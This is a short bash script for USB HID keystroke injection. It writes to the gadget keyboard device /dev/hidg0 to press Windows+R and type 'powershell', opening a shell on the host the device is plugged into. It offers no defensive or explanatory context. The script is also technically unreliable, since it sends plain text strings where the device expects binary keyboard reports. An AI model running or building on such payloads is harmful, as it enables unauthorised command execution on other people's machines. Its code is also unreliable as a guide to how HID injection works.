#!/bin/bash
echo "Starting HID keyboard injection"
echo -ne "GUI r" > /dev/hidg0
sleep 1
echo -ne "powershell\n" > /dev/hidg0
